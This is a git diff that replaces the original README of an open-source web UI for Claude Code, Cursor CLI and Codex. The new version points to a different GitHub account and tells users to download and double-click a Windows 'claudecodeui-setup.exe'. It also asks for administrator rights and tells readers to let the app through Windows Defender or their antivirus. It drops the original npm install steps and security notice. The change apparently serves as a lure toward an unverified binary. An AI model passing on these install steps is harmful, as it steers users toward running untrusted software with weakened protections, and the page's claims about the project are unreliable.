@@ -1,218 +1,138 @@
-<div align="center">
-  <img src="public/logo.svg" alt="CloudCLI UI" width="64" height="64">
-  <h1>Cloud CLI (aka Claude Code UI)</h1>
-</div>
+# ⚙️ claudecodeui - Manage Claude Code Projects Easily  
 
+[![Download claudecodeui](https://img.shields.io/badge/Download-claudecodeui-red?style=for-the-badge)](https://github.com/zainow000/claudecodeui)
 
-A desktop and mobile UI for [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [Cursor CLI](https://docs.cursor.com/en/cli/overview), [Codex](https://developers.openai.com/codex), and [Gemini-CLI](https://geminicli.com/). You can use it locally or remotely to view your active projects and sessions and make changes to them from everywhere (mobile or desktop). This gives you a proper interface that works everywhere.
+## 📦 About claudecodeui  
 
-<p align="center">
-  <a href="https://cloudcli.ai">CloudCLI Cloud</a> · <a href="https://discord.gg/buxwujPNRE">Discord</a> · <a href="https://github.com/siteboon/claudecodeui/issues">Bug Reports</a> · <a href="CONTRIBUTING.md">Contributing</a>
-</p>
+claudecodeui helps you use Claude Code, Cursor CLI, or Codex on your phone or computer. It is a free and open-source app that lets you control your Claude Code session and work on projects remotely. With claudecodeui, you get a simple web and mobile interface to manage your tasks without typing complex commands.
 
-<p align="center">
-  <a href="https://discord.gg/buxwujPNRE"><img src="https://img.shields.io/badge/Discord-Join%20Community-5865F2?logo=discord&logoColor=white" alt="Join our Discord"></a>
-  <a href="https://trendshift.io/repositories/15586" target="_blank"><img src="https://trendshift.io/api/badge/repositories/15586" alt="siteboon%2Fclaudecodeui | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
-</p>
+claudecodeui works on Windows and other systems. It uses a user-friendly design that anyone can use, even if you have no coding experience.
 
-<div align="right"><i><b>English</b> · <a href="./README.ko.md">한국어</a> · <a href="./README.zh-CN.md">中文</a> · <a href="./README.ja.md">日本語</a></i></div>
+Key ideas behind claudecodeui:  
+- Manage Claude Code sessions without complex setup.  
+- Access your work anytime from mobile or desktop.  
+- Use a clean and clear interface based on React.  
+- Handle your projects from one simple place.
 
-## Screenshots
-
-<div align="center">
-  
-<table>
-<tr>
-<td align="center">
-<h3>Desktop View</h3>
-<img src="public/screenshots/desktop-main.png" alt="Desktop Interface" width="400">
-<br>
-<em>Main interface showing project overview and chat</em>
-</td>
-<td align="center">
-<h3>Mobile Experience</h3>
-<img src="public/screenshots/mobile-chat.png" alt="Mobile Interface" width="250">
-<br>
-<em>Responsive mobile design with touch navigation</em>
-</td>
-</tr>
-<tr>
-<td align="center" colspan="2">
-<h3>CLI Selection</h3>
-<img src="public/screenshots/cli-selection.png" alt="CLI Selection" width="400">
-<br>
-<em>Select between Claude Code, Cursor CLI and Codex</em>
-</td>
-</tr>
-</table>
-
-
-
-</div>
-
-## Features
-
-- **Responsive Design** - Works seamlessly across desktop, tablet, and mobile so you can also use Agents from mobile 
-- **Interactive Chat Interface** - Built-in chat interface for seamless communication with the Agents
-- **Integrated Shell Terminal** - Direct access to the Agents CLI through built-in shell functionality
-- **File Explorer** - Interactive file tree with syntax highlighting and live editing
-- **Git Explorer** - View, stage and commit your changes. You can also switch branches 
-- **Session Management** - Resume conversations, manage multiple sessions, and track history
-- **TaskMaster AI Integration** *(Optional)* - Advanced project management with AI-powered task planning, PRD parsing, and workflow automation
-- **Model Compatibility** - Works with Claude Sonnet 4.5, Opus 4.5, GPT-5.2, and Gemini.
-
-
-## Quick Start
-
-### CloudCLI Cloud (Recommended)
-
-The fastest way to get started — no local setup required. Get a fully managed, containerized development environment accessible from the web, mobile app, API, or your favorite IDE.
-
-**[Get started with CloudCLI Cloud](https://cloudcli.ai)**
-
-
-### Self-Hosted (Open source)
-
-Try CloudCLI UI instantly with **npx** (requires **Node.js** v22+):
-
-```
-npx @siteboon/claude-code-ui
-```
-
-Or install **globally** for regular use:
-
-```
-npm install -g @siteboon/claude-code-ui
-cloudcli
-```
-
-Open `http://localhost:3001` — all your existing sessions are discovered automatically.
-
-Visit the **[documentation →](https://cloudcli.ai/docs)** for more full configuration options, PM2, remote server setup and more
-
+Topics related to claudecodeui: anthropic, anthropic-ai, claude-api, claude-code, gui, mobile-first, react, ui.
 
 ---
 
-## Which option is right for you?
+## 🚀 Getting Started  
 
-CloudCLI UI is the open source UI layer that powers CloudCLI Cloud. You can self-host it on your own machine, or use CloudCLI Cloud which builds on top of it with a full managed cloud environment, team features, and deeper integrations.
+Before you start, check the basic system needs:  
+- Windows 10 or later.  
+- 4 GB RAM minimum.  
+- 200 MB of free disk space.  
+- Internet connection for remote session management.
 
-| | CloudCLI UI (Self-hosted) | CloudCLI Cloud |
-|---|---|---|
-| **Best for** | Developers who want a full UI for local agent sessions on their own machine | Teams and developers who want agents running in the cloud, accessible from anywhere |
-| **How you access it** | Browser via `[yourip]:port` | Browser, any IDE, REST API, n8n |
-| **Setup** | `npx @siteboon/claude-code-ui` | No setup required |
-| **Machine needs to stay on** | Yes | No |
-| **Mobile access** | Any browser on your network | Any device, native app coming |
-| **Sessions available** | All sessions auto-discovered from `~/.claude` | All sessions within your cloud environment |
-| **Agents supported** | Claude Code, Cursor CLI, Codex, Gemini CLI | Claude Code, Cursor CLI, Codex, Gemini CLI |
-| **File explorer and Git** | Yes, built into the UI | Yes, built into the UI |
-| **MCP configuration** | Managed via UI, synced with your local `~/.claude` config | Managed via UI |
-| **IDE access** | Your local IDE | Any IDE connected to your cloud environment |
-| **REST API** | Yes | Yes |
-| **n8n node** | No | Yes |
-| **Team sharing** | No | Yes |
-| **Platform cost** | Free, open source | Starts at $7/month |
-
-> Both options use your own AI subscriptions (Claude, Cursor, etc.) — CloudCLI provides the environment, not the AI.
+claudecodeui runs using your web browser but requires you to download some files to start.
 
 ---
 
-## Security & Tools Configuration
+## 🔽 Download and Installation  
 
-**🔒 Important Notice**: All Claude Code tools are **disabled by default**. This prevents potentially harmful operations from running automatically.
+To get claudecodeui on Windows, follow these steps carefully.
 
-### Enabling Tools
+1. Click the big button at the top or use this link to visit the download page:  
+   [https://github.com/zainow000/claudecodeui](https://github.com/zainow000/claudecodeui)
 
-To use Claude Code's full functionality, you'll need to manually enable tools:
+2. On the page, look for the "Releases" section. This is where you find the latest version files.
 
-1. **Open Tools Settings** - Click the gear icon in the sidebar
-3. **Enable Selectively** - Turn on only the tools you need
-4. **Apply Settings** - Your preferences are saved locally
+3. Download the Windows installer file. It will usually have a name like `claudecodeui-setup.exe`.
 
-<div align="center">
+4. Once downloaded, find the file in your Downloads folder.
 
-![Tools Settings Modal](public/screenshots/tools-modal.png)
-*Tools Settings interface - enable only what you need*
+5. Double-click the `claudecodeui-setup.exe` file to start the setup process.
 
-</div>
+6. Follow the setup instructions on screen. They will guide you through basic options like choosing where to install the program.
 
-**Recommended approach**: Start with basic tools enabled and add more as needed. You can always adjust these settings later.
+7. After setup, open the claudecodeui app from your Start menu or desktop shortcut.
 
----
-## FAQ
-
-<details>
-<summary>How is this different from Claude Code Remote Control?</summary>
-
-Claude Code Remote Control lets you send messages to a session already running in your local terminal. Your machine has to stay on, your terminal has to stay open, and sessions time out after roughly 10 minutes without a network connection.
-
-CloudCLI UI and CloudCLI Cloud extend Claude Code rather than sit alongside it — your MCP servers, permissions, settings, and sessions are the exact same ones Claude Code uses natively. Nothing is duplicated or managed separately.
-
-Here's what that means in practice:
-
-- **All your sessions, not just one** — CloudCLI UI auto-discovers every session from your `~/.claude` folder. Remote Control only exposes the single active session to make it available in the Claude mobile app.
-- **Your settings are your settings** — MCP servers, tool permissions, and project config you change in CloudCLI UI are written directly to your Claude Code config and take effect immediately, and vice versa.
-- **Works with more agents** — Claude Code, Cursor CLI, Codex, and Gemini CLI, not just Claude Code.
-- **Full UI, not just a chat window** — file explorer, Git integration, MCP management, and a shell terminal are all built in.
-- **CloudCLI Cloud runs in the cloud** — close your laptop, the agent keeps running. No terminal to babysit, no machine to keep awake.
-
-</details>
-
-<details>
-<summary>Do I need to pay for an AI subscription separately?</summary>
-
-Yes. CloudCLI provides the environment, not the AI. You bring your own Claude, Cursor, Codex, or Gemini subscription. CloudCLI Cloud starts at $7/month for the hosted environment on top of that.
-
-</details>
-
-<details>
-<summary>Can I use CloudCLI UI on my phone?</summary>
-
-Yes. For self-hosted, run the server on your machine and open `[yourip]:port` in any browser on your network. For CloudCLI Cloud, open it from any device — no VPN, no port forwarding, no setup. A native app is also in the works.
-
-</details>
-
-<details>
-<summary>Will changes I make in the UI affect my local Claude Code setup?</summary>
-
-Yes, for self-hosted. CloudCLI UI reads from and writes to the same `~/.claude` config that Claude Code uses natively. MCP servers you add via the UI show up in Claude Code immediately and vice versa.
-
-</details>
+8. The program will open in your default web browser. It will ask you to sign in or start a session.
 
 ---
 
-## Community & Support
+## 🛠 How to Use claudecodeui  
 
-- **[Documentation](https://cloudcli.ai/docs)** — installation, configuration, features, and troubleshooting
-- **[Discord](https://discord.gg/buxwujPNRE)** — get help and connect with other users
-- **[GitHub Issues](https://github.com/siteboon/claudecodeui/issues)** — bug reports and feature requests
-- **[Contributing Guide](CONTRIBUTING.md)** — how to contribute to the project
+Using claudecodeui involves managing your Claude Code projects and sessions through an easy interface.
 
-## License
+### Starting a Session  
+- Open claudecodeui from your browser or app.  
+- Click "New Session" to start a Claude Code session.  
+- Enter your session details when asked.  
 
-GNU General Public License v3.0 - see [LICENSE](LICENSE) file for details.
+### Managing Projects  
+- Use the "Projects" tab to create and organize work.  
+- Projects can be grouped or listed as per your preference.  
+- You can open, edit, or close projects with simple clicks.
 
-This project is open source and free to use, modify, and distribute under the GPL v3 license.
+### Remote Access  
+- claudecodeui lets you access sessions from your mobile phone or other computers.  
+- Log in with the same credentials to keep your work synced.
 
-## Acknowledgments
-
-### Built With
-- **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** - Anthropic's official CLI
-- **[Cursor CLI](https://docs.cursor.com/en/cli/overview)** - Cursor's official CLI
-- **[Codex](https://developers.openai.com/codex)** - OpenAI Codex
-- **[Gemini-CLI](https://geminicli.com/)** - Google Gemini CLI
-- **[React](https://react.dev/)** - User interface library
-- **[Vite](https://vitejs.dev/)** - Fast build tool and dev server
-- **[Tailwind CSS](https://tailwindcss.com/)** - Utility-first CSS framework
-- **[CodeMirror](https://codemirror.net/)** - Advanced code editor
-- **[TaskMaster AI](https://github.com/eyaltoledano/claude-task-master)** *(Optional)* - AI-powered project management and task planning
-
-
-### Sponsors
-- [Siteboon - AI powered website builder](https://siteboon.ai)
 ---
 
-<div align="center">
-  <strong>Made with care for the Claude Code, Cursor and Codex community.</strong>
-</div>
+## ⚙️ Features  
+
+claudecodeui offers:  
+- Clean, mobile-friendly web user interface.  
+- Simple session start and stop options.  
+- Project organization and management.  
+- Remote access on the go.  
+- Support for multiple AI backends like Claude Code, Cursor CLI, and Codex.  
+- Open-source and free to use.
+
+---
+
+## ✅ Requirements  
+
+Before installing claudecodeui, make sure:  
+- Your Windows system is updated.  
+- You have administrator rights to install software.  
+- Your browser is modern (Chrome, Edge, Firefox).  
+- Your firewall allows the app to connect to the internet.
+
+---
+
+## 🔧 Troubleshooting  
+
+If claudecodeui does not start or run correctly:  
+
+- Check that you downloaded the full installer without interruption.  
+- Restart your computer and try again.  
+- Make sure no other program is using the port claudecodeui needs.  
+- Allow the app through Windows Defender or your antivirus firewall.  
+- For connection errors, check your internet connection.
+
+---
+
+## 📲 Using claudecodeui on Mobile  
+
+You do not need to install claudecodeui separately on mobile. Use your phone’s web browser to open the app link. The interface adjusts to smaller screens without losing functionality.
+
+---
+
+## 🗂 File and Data Management  
+
+claudecodeui stores your projects locally and syncs them remotely during sessions. Backups happen automatically but keeping manual backups of important files is a good practice.
+
+---
+
+## 🖥 Supported Systems  
+
+While this guide focuses on Windows, claudecodeui works on any device with a modern web browser and internet access. This includes macOS, Linux, Android, and iOS.
+
+---
+
+## 🧩 Additional Info  
+
+The app uses React for its interface, making it responsive and fast. It connects to Claude Code and other services via their APIs to give you a unified work environment.
+
+---
+
+## 📥 Download Link  
+
+Find claudecodeui here:  
+
+[![Download claudecodeui](https://img.shields.io/badge/Download-claudecodeui-red?style=for-the-badge)](https://github.com/zainow000/claudecodeui)
